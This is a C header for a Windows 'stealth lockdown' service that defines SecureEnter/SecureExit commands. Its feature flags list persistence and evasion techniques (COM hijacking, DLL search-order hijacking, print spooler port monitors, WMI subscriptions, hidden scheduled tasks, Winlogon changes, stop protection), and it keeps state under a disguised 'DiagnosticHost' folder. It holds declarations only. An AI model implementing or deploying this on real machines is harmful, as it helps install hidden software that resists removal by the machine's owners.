/*
 * stealth_lockdown.h - SecureEnter/SecureExit orchestration
 *
 * Implements W2: "Define SecureEnter / SecureExit commands plus IPC events
 * between client and service so lockdown activation becomes first-party."
 *
 * Also implements W4: "Create a registry policy module that sets Winlogon
 * shell/userinit, examine GPOs, and Explorer restrictions during SecureEnter;
 * persist originals under C:/ProgramData/DiagnosticHost/state.json."
 */

#ifndef STEALTH_LOCKDOWN_H
#define STEALTH_LOCKDOWN_H

#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Lockdown state */
typedef enum LockdownState {
    LOCKDOWN_STATE_INACTIVE = 0,
    LOCKDOWN_STATE_ENTERING = 1,
    LOCKDOWN_STATE_ACTIVE = 2,
    LOCKDOWN_STATE_EXITING = 3,
    LOCKDOWN_STATE_ERROR = 4
} LockdownState;

/* Lockdown feature flags */
typedef enum LockdownFeatures {
    LOCKDOWN_FEATURE_NONE              = 0x00000000,
    LOCKDOWN_FEATURE_SERVICE_PROTECT   = 0x00000001,  /* Protect service from stop */
    LOCKDOWN_FEATURE_WATCHDOG          = 0x00000002,  /* Enable watchdog mesh */
    LOCKDOWN_FEATURE_TASK_SCHEDULER    = 0x00000004,  /* Hidden restart tasks */
    LOCKDOWN_FEATURE_WMI_CONSUMER      = 0x00000008,  /* WMI event subscription */
    LOCKDOWN_FEATURE_REGISTRY_POLICY   = 0x00000010,  /* Registry policy enforcement */
    LOCKDOWN_FEATURE_WINLOGON          = 0x00000020,  /* Winlogon shell/userinit */
    LOCKDOWN_FEATURE_EXPLORER_POLICY   = 0x00000040,  /* Explorer restrictions */
    LOCKDOWN_FEATURE_COM_HIJACK        = 0x00000080,  /* COM hijacking persistence */
    LOCKDOWN_FEATURE_PORT_MONITOR      = 0x00000100,  /* Print spooler persistence */
    LOCKDOWN_FEATURE_DLL_HIJACK        = 0x00000200,  /* DLL search order hijack */
    LOCKDOWN_FEATURE_PROCESS_MONITOR   = 0x00000400,  /* Monitor/restart processes */
    LOCKDOWN_FEATURE_TAMPER_DETECTION  = 0x00000800,  /* Detect and log tampering */
    LOCKDOWN_FEATURE_ALL               = 0x00000FFF   /* All features */
} LockdownFeatures;

/* Lockdown configuration */
typedef struct LockdownConfig {
    DWORD enabledFeatures;           /* Bitmask of LockdownFeatures */
    BOOL logAllEvents;               /* Log all lockdown events */
    BOOL allowRemoteControl;         /* Allow IPC control commands */
    WCHAR stateFilePath[MAX_PATH];   /* Path to state.json */
    WCHAR logFilePath[MAX_PATH];     /* Path to lockdown log */
    WCHAR serviceName[64];           /* Service to protect */
    WCHAR serviceExePath[MAX_PATH];  /* Service executable path */
    WCHAR watchdogExePath[MAX_PATH]; /* Watchdog executable path */

    /* Process allowlist/blocklist */
    WCHAR allowedProcesses[2048];    /* Pipe-separated list */
    WCHAR blockedProcesses[2048];    /* Pipe-separated list */

    /* Timing */
    DWORD monitorIntervalMs;         /* Monitor check interval */
    DWORD watchdogIntervalMs;        /* Watchdog check interval */
} LockdownConfig;

/* Lockdown status information */
typedef struct LockdownStatus {
    LockdownState state;
    DWORD activeFeatures;
    DWORD tamperEvents;
    DWORD restoreAttempts;
    LONGLONG enterTime;
    LONGLONG lastCheckTime;
    WCHAR lastError[256];
} LockdownStatus;

/* Lockdown event types for logging */
typedef enum LockdownEventType {
    LOCKDOWN_EVENT_ENTER_START = 0,
    LOCKDOWN_EVENT_ENTER_COMPLETE = 1,
    LOCKDOWN_EVENT_EXIT_START = 2,
    LOCKDOWN_EVENT_EXIT_COMPLETE = 3,
    LOCKDOWN_EVENT_TAMPER_DETECTED = 4,
    LOCKDOWN_EVENT_RESTORE_SUCCESS = 5,
    LOCKDOWN_EVENT_RESTORE_FAILED = 6,
    LOCKDOWN_EVENT_FEATURE_ENABLED = 7,
    LOCKDOWN_EVENT_FEATURE_DISABLED = 8,
    LOCKDOWN_EVENT_ERROR = 9
} LockdownEventType;

/* Event callback for logging/telemetry */
typedef void (*LockdownEventCallback)(
    LockdownEventType eventType,
    DWORD featureId,
    const WCHAR* message,
    void* context
);

/*
 * Initialize the lockdown system
 * Must be called before any other Lockdown_* functions
 */
BOOL Lockdown_Init(const LockdownConfig* config);

/*
 * Enter lockdown mode (SecureEnter)
 * Activates all enabled lockdown features
 * Backs up original state to state file
 */
BOOL Lockdown_Enter(void);

/*
 * Exit lockdown mode (SecureExit)
 * Restores original state from state file
 * Deactivates all lockdown features
 */
BOOL Lockdown_Exit(void);

/*
 * Get current lockdown state
 */
LockdownState Lockdown_GetState(void);

/*
 * Get detailed status information
 */
void Lockdown_GetStatus(LockdownStatus* status);

/*
 * Enable a specific feature during active lockdown
 */
BOOL Lockdown_EnableFeature(LockdownFeatures feature);

/*
 * Disable a specific feature during active lockdown
 */
BOOL Lockdown_DisableFeature(LockdownFeatures feature);

/*
 * Check if a feature is currently active
 */
BOOL Lockdown_IsFeatureActive(LockdownFeatures feature);

/*
 * Update configuration (some changes require re-entering lockdown)
 */
BOOL Lockdown_UpdateConfig(const LockdownConfig* config);

/*
 * Register event callback for logging/telemetry
 */
void Lockdown_SetEventCallback(LockdownEventCallback callback, void* context);

/*
 * Force re-apply all active lockdown policies
 * Useful after detecting tampering
 */
BOOL Lockdown_Reapply(void);

/*
 * Check and restore any tampered items
 * Returns number of items restored
 */
DWORD Lockdown_CheckAndRestore(void);

/*
 * Handle IPC lockdown command
 * Called by IPC server when receiving SecureEnter/SecureExit
 */
BOOL Lockdown_HandleIpcCommand(DWORD commandType, const void* payload, DWORD payloadSize);

/*
 * Stop runtime monitoring/watchdog components without removing persistence artifacts.
 * Intended for service stop/restart paths where persistence must remain installed.
 */
BOOL Lockdown_StopRuntime(void);

/*
 * Cleanup and free resources
 * Does not implicitly SecureExit or remove persistence artifacts.
 */
void Lockdown_Cleanup(void);

/*
 * Emergency shutdown - immediately disable all lockdown without restore
 * Only use during uninstall or critical errors
 */
void Lockdown_EmergencyShutdown(void);

#ifdef __cplusplus
}
#endif

#endif /* STEALTH_LOCKDOWN_H */
